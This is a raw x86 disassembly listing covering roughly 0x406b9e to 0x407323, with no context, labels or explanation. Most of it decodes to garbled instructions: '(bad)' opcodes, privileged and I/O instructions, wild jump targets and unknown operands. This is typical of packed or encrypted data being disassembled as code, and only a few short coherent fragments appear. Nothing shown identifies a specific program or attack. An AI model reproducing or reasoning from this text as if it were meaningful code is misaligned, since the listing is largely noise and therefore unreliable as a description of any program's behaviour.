  406b9e:	shr    BYTE PTR [eax],0xcf
  406ba1:	in     eax,0x84
  406ba3:	repnz or al,0xbd
  406ba6:	inc    edi
  406ba7:	loope  0x406c21
  406ba9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  406bab:	xchg   ecx,eax
  406bac:	push   es
  406bad:	xchg   DWORD PTR [esi+esi*2-0x5e],edx
  406bb1:	jmp    0x406bd6
  406bb3:	cmp    eax,0xd4be208f
  406bb8:	mov    BYTE PTR [edi+ebx*2+0x1bd8cb73],0x13
  406bc0:	pop    es
  406bc1:	and    eax,0x4e768f2b
  406bc6:	adc    cl,BYTE PTR [ebp-0x21]
  406bc9:	push   esp
  406bca:	fwait
  406bcb:	shl    BYTE PTR [ebp+0x66ec94e4],0xd7
  406bd2:	clc    
  406bd3:	push   ebx
  406bd4:	fcom   QWORD PTR [esi]
  406bd6:	addr16 dec edi
  406bd8:	(bad)  
  406bd9:	icebp  
  406bda:	aam    0x6b
  406bdc:	mov    esi,0x1f1e46fd
  406be1:	cmp    BYTE PTR [ebx-0x34180e40],cl
  406be7:	test   DWORD PTR [ecx-0x6e],esi
  406bea:	push   ss
  406beb:	icebp  
  406bec:	mov    esp,DWORD PTR [esi-0x52d6267d]
  406bf2:	sbb    BYTE PTR [edi-0x60],cl
  406bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf6:	pop    esp
  406bf7:	shl    eax,cl
  406bf9:	sub    al,ch
  406bfb:	inc    ebp
  406bfc:	add    al,0xfe
  406bfe:	push   es
  406bff:	leave  
  406c00:	push   cs
  406c01:	or     dl,BYTE PTR [eax+edi*4+0x30]
  406c05:	xchg   edi,eax
  406c06:	imul   ecx,ecx,0xffffffa4
  406c09:	sbb    dh,dh
  406c0b:	cmp    ch,dl
  406c0d:	sbb    esi,0x27a65a70
  406c13:	fadd   st(2),st
  406c15:	(bad)  
  406c16:	push   ebx
  406c17:	and    BYTE PTR [esi+edi*1+0x1406e3ea],bh
  406c1e:	add    al,0xb4
  406c20:	stos   BYTE PTR es:[edi],al
  406c21:	adc    al,0x33
  406c23:	test   al,0x9c
  406c25:	gs inc ebp
  406c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c28:	jo     0x406c4d
  406c2a:	repz xchg ebx,eax
  406c2c:	sub    DWORD PTR [ecx+edi*4-0xb],0x47
  406c31:	in     al,0x59
  406c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c34:	mov    BYTE PTR [ebx-0x63b48404],al
  406c3a:	in     eax,dx
  406c3b:	cmp    edx,DWORD PTR [esi+eiz*2+0x41fb134d]
  406c42:	add    esp,DWORD PTR [ebx+eiz*1+0x31c3afd5]
  406c49:	scas   eax,DWORD PTR es:[edi]
  406c4a:	sub    edi,DWORD PTR [eax-0x145d1a6b]
  406c50:	adc    eax,0x3aa03b06
  406c55:	in     eax,dx
  406c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c57:	neg    BYTE PTR [ebx+0x70]
  406c5a:	mov    eax,0x57ea966d
  406c5f:	xor    edi,esi
  406c61:	sar    DWORD PTR [ecx+ecx*8],1
  406c64:	or     BYTE PTR [edx-0x71],al
  406c67:	jae    0x406cc2
  406c69:	std    
  406c6a:	push   ds
  406c6b:	(bad)  
  406c6d:	jle    0x406c25
  406c6f:	dec    edi
  406c70:	xchg   esi,eax
  406c71:	dec    edi
  406c72:	xor    al,0x2b
  406c74:	fistp  WORD PTR [ecx]
  406c76:	or     bl,0x99
  406c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c7a:	and    eax,0x1175c666
  406c7f:	fisttp QWORD PTR [ebx-0x555a18c4]
  406c85:	test   bl,ah
  406c87:	daa    
  406c88:	int    0xd6
  406c8a:	push   0x48
  406c8c:	pop    ss
  406c8d:	mov    al,0xbe
  406c8f:	iret   
  406c90:	pop    ebp
  406c91:	inc    eax
  406c92:	mov    dh,0xd1
  406c94:	jmp    0x5ab16d0d
  406c99:	test   DWORD PTR [ebx+0x2f5f2ad1],0x3e2f25d8
  406ca3:	dec    eax
  406ca4:	mov    bl,0x59
  406ca6:	jae    0x406c9b
  406ca8:	xchg   esi,eax
  406ca9:	ret    0x956c
  406cac:	adc    bh,BYTE PTR es:[eax+0x16]
  406cb0:	lock addr16 pop ds
  406cb3:	ja     0x406c8b
  406cb5:	xor    al,0x70
  406cb7:	lods   eax,DWORD PTR ds:[esi]
  406cb8:	mov    dh,BYTE PTR [edx]
  406cba:	repnz xor esp,ebx
  406cbd:	and    al,0x67
  406cbf:	mov    dh,dh
  406cc1:	pusha  
  406cc2:	ins    DWORD PTR es:[edi],dx
  406cc3:	les    ebx,FWORD PTR [esp+edi*1+0x5c4e6e86]
  406cca:	pop    esi
  406ccb:	push   ebx
  406ccc:	adc    eax,0x50501ded
  406cd1:	lods   al,BYTE PTR ds:[esi]
  406cd2:	ins    DWORD PTR es:[edi],dx
  406cd3:	push   cs
  406cd4:	jo     0x406d16
  406cd6:	mov    WORD PTR [ecx-0xca6d265],fs
  406cdc:	aad    0x95
  406cde:	xor    eax,0x24c8ff7d
  406ce3:	sub    BYTE PTR [eax-0xd],cl
  406ce6:	in     eax,dx
  406ce7:	cli    
  406ce8:	adc    al,0xb2
  406cea:	ja     0x406cf2
  406cec:	(bad)  
  406cee:	in     eax,0x0
  406cf0:	xor    bl,BYTE PTR [ebx+edx*1]
  406cf3:	mov    eax,ds:0x878253ea
  406cf8:	xor    eax,ebp
  406cfa:	mov    ds:0x981a8bf1,eax
  406cff:	sub    bh,BYTE PTR [ebx+0x3c]
  406d02:	mov    bl,0x86
  406d04:	jg     0x406cfc
  406d06:	test   DWORD PTR [esi],edi
  406d08:	push   ds
  406d09:	dec    eax
  406d0a:	(bad)  
  406d0b:	adc    edx,DWORD PTR [eax]
  406d0d:	cmp    BYTE PTR [ebx],cl
  406d0f:	xchg   edi,eax
  406d10:	push   ebx
  406d11:	(bad)  
  406d12:	inc    esp
  406d13:	jl     0x406cb8
  406d15:	mov    dh,0x67
  406d17:	xor    al,0xca
  406d19:	and    BYTE PTR [ebx-0x70],cl
  406d1c:	imul   ebx,DWORD PTR [edx+0x4f],0xffffffef
  406d20:	int    0x93
  406d22:	pop    edx
  406d23:	dec    eax
  406d24:	mov    ecx,0xbcc915a3
  406d29:	add    BYTE PTR [ebp-0x6d],ch
  406d2c:	dec    edi
  406d2d:	pop    ds
  406d2e:	mov    WORD PTR [ebx],ss
  406d30:	std    
  406d31:	add    ebx,DWORD PTR [edx]
  406d33:	dec    esp
  406d34:	sti    
  406d35:	shr    ebp,0x6e
  406d38:	mov    ah,0xcc
  406d3a:	pop    esi
  406d3b:	push   ebp
  406d3c:	retf   
  406d3d:	pushf  
  406d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d3f:	inc    esp
  406d40:	dec    edi
  406d41:	jnp    0x406d1b
  406d43:	push   esp
  406d44:	shl    BYTE PTR [ebp+0xa],0x7
  406d48:	push   ebx
  406d49:	sub    ebx,esi
  406d4b:	fcmovb st,st(1)
  406d4d:	cld    
  406d4e:	push   edi
  406d4f:	mov    ah,BYTE PTR [esi+0x33]
  406d52:	sar    DWORD PTR [ecx+0x3b02],0x81
  406d59:	sbb    eax,0x43382f
  406d5e:	adc    esi,DWORD PTR [edi]
  406d60:	inc    ebx
  406d61:	add    BYTE PTR [esi+0x3],ah
  406d64:	rol    DWORD PTR [ecx+0x43382305],0x0
  406d6b:	push   edi
  406d6c:	jge    0x406d6e
  406d6e:	add    BYTE PTR [ebx-0x48f0f7b3],cl
  406d74:	rol    BYTE PTR [ecx+0x4337631d],0x0
  406d7b:	getsec 
  406d7d:	inc    ebx
  406d7e:	add    cl,ch
  406d80:	fiadd  DWORD PTR [ecx]
  406d82:	add    BYTE PTR [eax],al
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x3
  406d91:	jne    0x406d1d
  406d93:	pop    eax
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xc07e7e7f
  406d9d:	xor    al,0xc6
  406d9f:	jb     0x406d40
  406da1:	mov    dl,0x2a
  406da3:	pop    eax
  406da4:	fwait
  406da5:	inc    ebp
  406da6:	scas   eax,DWORD PTR es:[edi]
  406da7:	addr16 xchg edx,ebp
  406daa:	addr16 and edi,edx
  406dad:	inc    ecx
  406dae:	ins    BYTE PTR es:[edi],dx
  406daf:	repnz shl DWORD PTR [ebx+eiz*8+0x42],cl
  406db4:	xchg   esp,eax
  406db5:	das    
  406db6:	pop    esi
  406db7:	fimul  DWORD PTR [edx]
  406db9:	cli    
  406dba:	jge    0x406e12
  406dbc:	push   ds
  406dbd:	popa   
  406dbe:	jg     0x406e2c
  406dc0:	(bad)  
  406dc1:	jmp    0xdc0f:0xc335358d
  406dc8:	jb     0x406e28
  406dca:	std    
  406dcb:	aam    0xfb
  406dcd:	mov    esp,0xc069d1c3
  406dd2:	cdq    
  406dd3:	xor    bh,BYTE PTR [edi+0x711d74a4]
  406dd9:	fwait
  406dda:	inc    ebx
  406ddb:	(bad)  
  406ddc:	push   0xffffff90
  406dde:	addr16 push edx
  406de0:	pushf  
  406de1:	inc    ebp
  406de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406de3:	cdq    
  406de4:	jge    0x406dee
  406de6:	dec    eax
  406de7:	xlat   BYTE PTR ds:[ebx]
  406de8:	adc    DWORD PTR [ebx],ecx
  406dea:	sub    edi,DWORD PTR [ebp+0x4e]
  406ded:	in     al,0x78
  406def:	outs   dx,DWORD PTR ds:[esi]
  406df0:	xor    eax,0x8a25798b
  406df5:	mov    WORD PTR [ebp+0x5c],es
  406df8:	add    ch,BYTE PTR [eax+0x6d]
  406dfb:	or     dh,bh
  406dfd:	mov    ecx,0x3326a466
  406e02:	mov    al,BYTE PTR [esi+0x107fc66e]
  406e08:	sti    
  406e09:	les    esp,FWORD PTR [edx+0x22]
  406e0c:	xchg   esi,eax
  406e0d:	xchg   ecx,eax
  406e0e:	aad    0x22
  406e10:	sub    DWORD PTR [ebx-0xd434f6],eax
  406e16:	jl     0x406e52
  406e18:	adc    al,0xf0
  406e1a:	gs adc eax,0xa5fbc0db
  406e20:	ins    DWORD PTR es:[edi],dx
  406e21:	adc    esp,DWORD PTR [edi+0x3e0fa692]
  406e27:	add    al,0xa3
  406e29:	mov    eax,0x264e93cc
  406e2e:	sub    bl,bh
  406e30:	add    al,0xc8
  406e32:	xchg   esi,eax
  406e33:	add    BYTE PTR [ebx],cl
  406e35:	mov    BYTE PTR [edx],bh
  406e37:	repz mov dl,bh
  406e3a:	jge    0x406e56
  406e3c:	mov    dl,BYTE PTR [edi]
  406e3e:	ins    DWORD PTR es:[edi],dx
  406e3f:	in     eax,dx
  406e40:	xor    esp,DWORD PTR [edi+0xc]
  406e43:	xchg   BYTE PTR [eax-0x282b3e6a],bh
  406e49:	push   esp
  406e4a:	sar    DWORD PTR [edx+0x4fbfbfb4],1
  406e50:	mov    al,0xc5
  406e52:	je     0x406de6
  406e54:	xor    eax,DWORD PTR [ebp+0x4625be60]
  406e5a:	dec    eax
  406e5b:	aaa    
  406e5c:	xchg   ebx,eax
  406e5d:	mov    bl,0x4d
  406e5f:	test   BYTE PTR [ecx-0x30],dh
  406e62:	cdq    
  406e63:	cmp    al,0x8f
  406e65:	inc    ecx
  406e66:	mov    ebp,0xef8dcc5a
  406e6b:	xor    esp,ebx
  406e6d:	fwait
  406e6e:	mov    ds:0xb9994c87,al
  406e73:	push   eax
  406e74:	cmp    dl,bh
  406e76:	sub    al,0x1f
  406e78:	daa    
  406e79:	in     al,0x1c
  406e7b:	cmp    BYTE PTR [edx+eiz*8+0x629d94b0],cl
  406e82:	mov    WORD PTR [ebp-0x6985feb2],?
  406e88:	out    dx,al
  406e89:	and    eax,0xd84c88fc
  406e8e:	inc    ecx
  406e8f:	xchg   ebx,eax
  406e90:	aas    
  406e91:	std    
  406e92:	pop    edi
  406e94:	das    
  406e95:	jp     0x406e77
  406e97:	inc    edi
  406e98:	xchg   esi,eax
  406e99:	sbb    BYTE PTR [edx+edx*1-0x7dd69997],bl
  406ea0:	sub    BYTE PTR [edx],dl
  406ea2:	pop    es
  406ea3:	jne    0x406e86
  406ea5:	or     BYTE PTR [edi],cl
  406ea7:	sar    BYTE PTR [ecx],cl
  406ea9:	call   0xe6e73863
  406eae:	pop    edx
  406eaf:	push   cs
  406eb0:	cmp    BYTE PTR [edx-0x4bb7ced0],dl
  406eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eb7:	gs pop ss
  406eb9:	dec    ebp
  406eba:	out    0x4d,eax
  406ebc:	adc    ebp,ebp
  406ebe:	cmp    eax,ebx
  406ec0:	scas   al,BYTE PTR es:[edi]
  406ec1:	std    
  406ec2:	fs sub al,0xbe
  406ec5:	lds    eax,FWORD PTR [ecx+edx*1]
  406ec8:	or     ebx,DWORD PTR [ebx]
  406eca:	mov    edx,0xf31bb627
  406ecf:	stc    
  406ed0:	add    ch,dh
  406ed2:	(bad)  
  406ed4:	stos   DWORD PTR es:[edi],eax
  406ed5:	mov    BYTE PTR [edi+edx*8+0xa],ch
  406ed9:	fisubr DWORD PTR [edi]
  406edb:	pushf  
  406edc:	(bad)  
  406edd:	icebp  
  406ede:	sar    DWORD PTR [edx-0x4c],cl
  406ee1:	lahf   
  406ee2:	add    al,0xbe
  406ee4:	iret   
  406ee5:	in     eax,dx
  406ee6:	(bad)  
  406ee7:	adc    al,0xa8
  406ee9:	cdq    
  406eea:	in     eax,dx
  406eeb:	jnp    0x406eab
  406eed:	sub    eax,0x6b98782f
  406ef2:	sbb    edx,DWORD PTR [esi+0x56]
  406ef5:	call   0x19d128f1
  406efa:	or     al,ch
  406efc:	push   ebp
  406efd:	ficom  WORD PTR [ecx-0x31]
  406f00:	imul   edx,esp,0x1e
  406f03:	sub    eax,0x76787e2d
  406f08:	inc    edx
  406f09:	ins    DWORD PTR es:[edi],dx
  406f0a:	jecxz  0x406ee9
  406f0c:	aad    0x4d
  406f0e:	add    al,0xfe
  406f10:	stc    
  406f11:	sub    eax,eax
  406f13:	aas    
  406f14:	jg     0x406f1d
  406f16:	ds xchg ecx,eax
  406f18:	stc    
  406f19:	or     eax,0x3735f577
  406f1e:	and    al,0x41
  406f20:	and    ebp,edx
  406f22:	xchg   edx,eax
  406f23:	dec    esp
  406f24:	and    BYTE PTR ds:0x5d44c5dc,ch
  406f2a:	mov    al,ds:0x31daa687
  406f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f30:	out    0xc0,eax
  406f32:	dec    ebp
  406f33:	shr    BYTE PTR [ebp+ebx*1+0x46ec7e97],1
  406f3a:	sub    eax,0xdfcc7a1
  406f3f:	pop    esp
  406f40:	clc    
  406f41:	pop    ebp
  406f42:	sbb    eax,0x27e1fe71
  406f47:	or     dl,BYTE PTR [ecx]
  406f49:	sub    edx,DWORD PTR ds:0xb439f003
  406f4f:	rol    ch,1
  406f51:	into   
  406f52:	inc    eax
  406f53:	add    edx,DWORD PTR [ecx+0x30f86a98]
  406f59:	jg     0x406ef7
  406f5b:	hlt    
  406f5c:	push   cs
  406f5d:	mov    ebx,0x2581d0f7
  406f62:	getsec 
  406f64:	inc    ebx
  406f65:	add    BYTE PTR [ebx+0x37],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xaf28ca7e
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x917e7e7f
  406f9f:	shl    DWORD PTR [eax+0x50],cl
  406fa2:	pop    edx
  406fa3:	(bad)  
  406fa5:	mov    DWORD PTR [edx+0x6c5982b3],ebp
  406fab:	sub    bl,BYTE PTR [eax-0x729cf3e3]
  406fb1:	push   ss
  406fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb3:	pop    esi
  406fb4:	gs mov ah,0xb5
  406fb7:	cmp    eax,DWORD PTR [ebp+0x23392b52]
  406fbd:	scas   eax,DWORD PTR es:[edi]
  406fbe:	cmp    eax,0xfef261be
  406fc3:	cmp    esi,0xfd014b77
  406fc9:	gs retf 
  406fcb:	scas   al,BYTE PTR es:[edi]
  406fcc:	adc    DWORD PTR [edx],0x53
  406fcf:	cld    
  406fd0:	dec    eax
  406fd1:	lods   al,BYTE PTR ds:[esi]
  406fd2:	jle    0x406fdd
  406fd4:	inc    edx
  406fd5:	mov    al,ds:0x7be308b2
  406fda:	lods   eax,DWORD PTR ds:[esi]
  406fdb:	ds aas 
  406fdd:	inc    ecx
  406fde:	cmp    al,0x13
  406fe0:	outs   dx,DWORD PTR ds:[esi]
  406fe1:	and    eax,0x1944c1b9
  406fe6:	sbb    DWORD PTR [ebx],edi
  406fe8:	and    al,0xdd
  406fea:	outs   dx,DWORD PTR ds:[esi]
  406feb:	lods   eax,DWORD PTR ds:[esi]
  406fec:	pop    ds
  406fed:	iret   
  406fee:	adc    al,BYTE PTR [edi]
  406ff0:	xchg   edi,eax
  406ff1:	rol    BYTE PTR [ebx-0x70ae2527],1
  406ff7:	mov    al,ds:0x3850b59c
  406ffc:	or     DWORD PTR [ecx+0x40],0xffffff98
  407000:	retf   
  407001:	mov    esp,esi
  407003:	xor    eax,0xde7adea7
  407008:	xlat   BYTE PTR ds:[ebx]
  407009:	(bad)  
  40700a:	shr    BYTE PTR [ebx-0x12791739],cl
  407010:	hlt    
  407011:	sbb    ah,bl
  407013:	dec    edi
  407014:	mov    eax,ds:0xe11ac5eb
  407019:	jmp    0x78a:0x5a3cccc
  407020:	push   0xffffff96
  407022:	jns    0x407098
  407024:	cmp    eax,0xeddd3430
  407029:	xchg   ebp,eax
  40702a:	sbb    al,0xa9
  40702c:	fild   DWORD PTR [ecx+0x131c450]
  407032:	dec    eax
  407033:	aam    0xcc
  407035:	push   ebp
  407036:	mov    ds:0xebc0ee7c,eax
  40703b:	jbe    0x40702b
  40703d:	lods   eax,DWORD PTR ds:[esi]
  40703e:	pop    esi
  40703f:	mov    ch,0xb4
  407041:	or     al,0x3
  407043:	add    BYTE PTR [edx+0x69],cl
  407046:	xchg   edi,eax
  407047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407048:	jne    0x406fce
  40704a:	mov    al,0x31
  40704c:	aad    0x8
  40704e:	adc    DWORD PTR [esi],edx
  407050:	add    al,0x68
  407052:	cmp    eax,0xeadc4a78
  407057:	jne    0x407028
  407059:	sub    DWORD PTR [edi],edi
  40705b:	rcr    DWORD PTR [eax+0x69],cl
  40705e:	(bad)  
  40705f:	mov    gs,WORD PTR [esi-0x6c]
  407062:	lds    eax,FWORD PTR [ecx+ebp*4]
  407065:	sahf   
  407066:	dec    eax
  407067:	rcl    DWORD PTR [edx-0x6b],cl
  40706a:	(bad)  
  40706b:	and    eax,0x59b5edf
  407070:	add    al,0x1a
  407072:	mov    gs,WORD PTR [esi+0x4726d669]
  407078:	in     eax,dx
  407079:	inc    al
  40707b:	cmp    esi,DWORD PTR ds:[edx-0x6a]
  40707f:	int    0x84
  407081:	add    DWORD PTR cs:[esi+eiz*2-0x469616dc],esp
  407089:	jge    0x40707a
  40708b:	neg    ecx
  40708d:	stos   BYTE PTR es:[edi],al
  40708e:	jnp    0x4070d9
  407090:	cmp    DWORD PTR [esi+0x255e246e],0xbdfcd2e7
  40709a:	out    0x1e,al
  40709c:	cmp    ebx,edi
  40709e:	popa   
  40709f:	mov    ah,0xaa
  4070a1:	xchg   esp,eax
  4070a2:	jnp    0x4070c8
  4070a4:	mov    ds:0xa9058b18,al
  4070a9:	stc    
  4070aa:	out    dx,eax
  4070ab:	cli    
  4070ac:	icebp  
  4070ad:	(bad)
  4070b1:	and    ebx,DWORD PTR [edx]
  4070b3:	inc    BYTE PTR [ebx]
  4070b5:	inc    edx
  4070b6:	jg     0x40707c
  4070b8:	fidivr WORD PTR [eax+0x6f]
  4070bb:	pop    ebp
  4070bc:	in     eax,dx
  4070bd:	clc    
  4070be:	mov    ebp,DWORD PTR [ecx]
  4070c0:	sbb    BYTE PTR [edx+0x15],bh
  4070c3:	cmp    DWORD PTR [esi-0xc],edi
  4070c6:	adc    cl,cl
  4070c8:	or     eax,0x7285d109
  4070cd:	xor    eax,0x6df34aed
  4070d2:	push   ebx
  4070d3:	pushf  
  4070d4:	push   0x866b3683
  4070d9:	lahf   
  4070da:	xchg   al,cl
  4070dc:	pop    ebx
  4070dd:	xchg   esi,eax
  4070de:	in     al,0x44
  4070e0:	in     eax,0xc6
  4070e2:	in     al,0xc0
  4070e4:	adc    DWORD PTR [edx],eax
  4070e6:	nop
  4070e7:	add    eax,0x5eb22622
  4070ec:	pop    eax
  4070ed:	push   0x52d983e8
  4070f2:	sub    al,0x7b
  4070f4:	scas   eax,DWORD PTR es:[edi]
  4070f5:	jbe    0x407087
  4070f7:	sub    al,0xa2
  4070f9:	int    0x60
  4070fb:	jbe    0x407150
  4070fd:	jno    0x407160
  4070ff:	mov    dl,0x6c
  407101:	sar    BYTE PTR ds:0xfff35fd7,cl
  407107:	xlat   BYTE PTR ds:[ebx]
  407108:	loopne 0x4070d6
  40710a:	add    dl,BYTE PTR [ebx-0x2b]
  40710d:	fwait
  40710e:	idiv   edx
  407110:	call   DWORD PTR [ecx]
  407112:	xor    al,0x2d
  407115:	jmp    0x40715e
  407117:	ret    
  407118:	ss cmp DWORD PTR gs:[eax*4-0x2201402a],0xb379ba5a
  407125:	nop    DWORD PTR [edi+0x4]
  407129:	popa   
  40712a:	mov    ds:0xd40d6e8a,al
  40712f:	mov    ecx,0xd0caa2ef
  407134:	loopne 0x407197
  407136:	xchg   DWORD PTR [ebx],esi
  407138:	icebp  
  407139:	xchg   esi,eax
  40713a:	mov    ?,WORD PTR [edi+0x463f1ba8]
  407140:	(bad)  
  407141:	and    WORD PTR [ebp+0x3db7c626],bx
  407148:	mov    cl,0x39
  40714a:	xchg   dl,bh
  40714c:	pop    ebx
  40714d:	push   eax
  40714e:	ds dec edx
  407150:	adc    BYTE PTR [ebp+0x59d63aa8],0xaa
  407157:	xor    eax,0xd180668b
  40715c:	leave  
  40715d:	cmp    BYTE PTR [esi],bh
  40715f:	dec    ebp
  407160:	push   DWORD PTR [ebp+0x8]
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	aad    0x82
  40717d:	dec    ebp
  40717e:	outs   dx,BYTE PTR ds:[esi]
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xae7e7e7f
  407188:	mov    ?,WORD PTR [ebx]
  40718a:	test   eax,0x449c24aa
  40718f:	xchg   edx,eax
  407190:	jmp    0x1b677e6b
  407195:	pusha  
  407196:	mov    dl,0x3d
  407198:	mov    ebx,0x5b5592cd
  40719d:	and    dl,dl
  40719f:	aas    
  4071a0:	retf   0x9fbf
  4071a3:	arpl   di,bp
  4071a5:	(bad)  
  4071a6:	(bad)  
  4071a7:	cmp    dh,dl
  4071a9:	es push ebx
  4071ab:	push   esp
  4071ac:	add    esp,DWORD PTR [ebx]
  4071ae:	and    bh,0xb2
  4071b1:	je     0x40714d
  4071b3:	es jb  0x407234
  4071b6:	adc    eax,0x455b5d3c
  4071bb:	sti    
  4071bc:	mov    ch,0x91
  4071be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071bf:	pop    edi
  4071c0:	lds    ebp,FWORD PTR [esi]
  4071c2:	dec    eax
  4071c3:	imul   esi,DWORD PTR [edx-0x52139a4],0xe2d81772
  4071cd:	mov    bl,0x59
  4071cf:	leave  
  4071d0:	inc    edi
  4071d1:	cld    
  4071d2:	cmc    
  4071d3:	jno    0x4071fe
  4071d5:	fldenv [esi+0x5f]
  4071d8:	jp     0x4071b4
  4071da:	mov    ah,0xf1
  4071dc:	mov    edi,0x10b4e20a
  4071e1:	psubw  mm1,QWORD PTR [ebx]
  4071e4:	jne    0x4071ca
  4071e6:	outs   dx,DWORD PTR ds:[esi]
  4071e7:	(bad)  
  4071e8:	in     eax,0xab
  4071ea:	inc    edx
  4071eb:	or     DWORD PTR [eax-0x4b97bdf6],esp
  4071f1:	push   0xffffffcc
  4071f3:	fdivp  st(1),st
  4071f5:	add    al,0x4d
  4071f7:	pop    ss
  4071f8:	(bad)  
  4071f9:	mov    esp,0x6fa658d7
  4071fe:	cmp    al,0x39
  407200:	push   0xfffffff3
  407202:	pusha  
  407203:	hlt    
  407204:	(bad)  
  407205:	adc    BYTE PTR [ebx-0x24],al
  407208:	loop   0x407231
  40720a:	mov    eax,ds:0x99e51a18
  40720f:	leave  
  407210:	mov    BYTE PTR [ecx+0x1022b1e1],dh
  407216:	adc    DWORD PTR [eax-0x5caca913],0xd076a291
  407220:	pop    es
  407221:	fiadd  WORD PTR [edx+0x5b]
  407224:	lds    ebx,FWORD PTR [edi]
  407226:	inc    ebx
  407227:	inc    edx
  407228:	in     al,0x19
  40722a:	hlt    
  40722b:	retf   
  40722c:	pop    edx
  40722d:	(bad)  
  40722e:	(bad)  [edx+0x7ef1ef90]
  407234:	sbb    esp,ebx
  407236:	xchg   esi,eax
  407237:	adc    DWORD PTR [ebx+0x26872c03],edi
  40723d:	arpl   WORD PTR [ebp+0x55],cx
  407240:	mov    bl,0x2c
  407242:	jmp    0x407274
  407244:	mov    esi,0xd9c0f562
  407249:	test   BYTE PTR cs:[eax-0x41],0xa7
  40724e:	ja     0x407296
  407250:	clc    
  407251:	dec    edx
  407252:	xchg   ecx,eax
  407253:	(bad)  
  407254:	scas   eax,DWORD PTR es:[edi]
  407255:	std    
  407256:	pop    ebp
  407257:	or     eax,0x79e5bf1c
  40725c:	js     0x40727d
  40725e:	mov    ecx,0x90be3b01
  407263:	enter  0xc4dc,0x3a
  407267:	into   
  407268:	xchg   eax,ebx
  40726a:	or     DWORD PTR [ecx+edi*2-0x14],esi
  40726e:	mov    al,0x9d
  407270:	mov    di,WORD PTR [ebx-0x1d]
  407274:	jo     0x4072a9
  407276:	push   esi
  407277:	test   bh,dh
  407279:	aam    0x29
  40727b:	inc    esi
  40727c:	mov    ebx,0x35755136
  407281:	cwde   
  407282:	popf   
  407283:	sub    eax,0xd3ff42b7
  407288:	mov    eax,0xe4418db5
  40728d:	push   esi
  40728e:	push   esi
  40728f:	iret   
  407290:	aam    0xd5
  407292:	mov    ah,BYTE PTR [edi]
  407294:	pop    ss
  407295:	sub    ebp,DWORD PTR [ebp-0x26]
  407298:	pop    esp
  407299:	jne    0x407239
  40729b:	mov    WORD PTR [edi-0x1e6154ad],ds
  4072a1:	sti    
  4072a2:	mov    al,0x27
  4072a4:	sar    DWORD PTR [esi+0x25],cl
  4072a7:	adc    ch,al
  4072a9:	icebp  
  4072aa:	dec    edx
  4072ab:	addr16 sub al,0x89
  4072ae:	and    BYTE PTR [edx],0x25
  4072b1:	jl     0x407306
  4072b3:	jno    0x4072d2
  4072b5:	push   esi
  4072b6:	push   esp
  4072b7:	adc    eax,0xef2b903b
  4072bc:	es (bad) 
  4072be:	mov    WORD PTR [ebp-0x3f],?
  4072c1:	add    ch,BYTE PTR [ecx]
  4072c3:	mov    ds:0xf34fa6d9,al
  4072c8:	pop    esp
  4072ca:	pusha  
  4072cb:	fs js  0x407348
  4072ce:	pop    ebx
  4072cf:	daa    
  4072d0:	call   0x372f167a
  4072d5:	mov    edi,0xa833885d
  4072da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072db:	jl     0x407307
  4072dd:	pop    eax
  4072de:	repnz outs dx,DWORD PTR ds:[esi]
  4072e0:	(bad)  
  4072e1:	adc    eax,0x43b0fc15
  4072e6:	test   BYTE PTR [esp+eax*4-0x694b241],dl
  4072ed:	lock scas al,BYTE PTR es:[edi]
  4072ef:	mov    esi,eax
  4072f1:	mov    cl,0x59
  4072f3:	mov    ch,0xeb
  4072f5:	ins    DWORD PTR es:[edi],dx
  4072f6:	xchg   edx,eax
  4072f7:	(bad)  
  4072f8:	jmp    0x4072e1
  4072fa:	xchg   edx,eax
  4072fb:	push   ebp
  4072fc:	pushf  
  4072fd:	sbb    ebp,edi
  4072ff:	adc    ah,ch
  407301:	ins    BYTE PTR es:[edi],dx
  407302:	mov    ah,0x8f
  407304:	stc    
  407305:	into   
  407306:	cdq    
  407307:	(bad)  
  407308:	xchg   edi,eax
  407309:	in     eax,dx
  40730a:	cmp    cl,BYTE PTR [eax-0x53c7ec8d]
  407310:	pop    bp
  407312:	inc    esi
  407313:	dec    ebx
  407314:	xor    al,0xfc
  407316:	push   ebx
  407317:	inc    eax
  407318:	rcr    dh,0x25
  40731b:	test   eax,0x3680295
  407320:	mov    ah,0xf2
  407322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407323:	fstp   TBYTE PTR [ecx+0x595aacc3]
